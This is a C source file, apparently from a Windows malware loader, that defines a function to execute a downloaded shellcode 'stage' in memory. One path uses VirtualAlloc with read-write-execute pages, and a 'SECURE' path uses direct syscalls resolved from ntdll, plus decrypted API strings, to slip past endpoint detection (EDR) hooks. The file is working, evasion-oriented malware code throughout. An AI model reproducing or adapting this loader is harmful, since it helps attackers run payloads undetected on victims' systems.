#include <stdio.h>
#include <windows.h>
#include <winhttp.h>

#include "loader.h"
#include "strings.h"
#include "syscalls.h"
#include "imports.h"

VOID ExecuteStage(CHAR* Stage, DWORD sSize)
{
    // execute the stage

    // if we are not running in secure mode then use winapi calls.
    // not caring about creating a new PAGE_EXECUTE_READWRITE cause theres no EDR right?
    #ifndef SECURE
        void* module = VirtualAlloc(0, sSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(module, Stage, sSize);
        ((void(*)())module)();
        return;
    #endif

    DWORD status;
    ULONG OldPro;
    LPVOID pBuffer = NULL;
    struct NtInfo NtdllInfo;
    struct Syscalls rSyscall;
    SIZE_T uSize = (SIZE_T)sSize;

    ParseNtdll(&NtdllInfo, &rSyscall);

    // alloc the memory we need
    GetCurrentProcess_ rGetCurrentProcess = (GetCurrentProcess_)GetProcAddress(LoadLibrary("kernel32.dll"), decrypt_string(STRING_KERNEL32_CPROC, STRING_KERNEL32_CPROC_KEY));

    MakeSyscall("NtAllocateVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
    status = rSyscall.NtAllocateVirtualMemory(rGetCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
    CleanSyscall(SyscallStub);

    // copy the memory into the allocated memory
    memcpy(pBuffer, Stage, sSize);

    // change the permisions to PAGE_EXECUTE_READWRITE
    MakeSyscall("NtProtectVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
    status = rSyscall.NtProtectVirtualMemory(rGetCurrentProcess(), &pBuffer, &uSize, PAGE_EXECUTE_READWRITE, &OldPro);
    printf("status: 0x%x\n", status);
    CleanSyscall(SyscallStub);

    // execute the code
    ((void(*)())pBuffer)();

    return;
}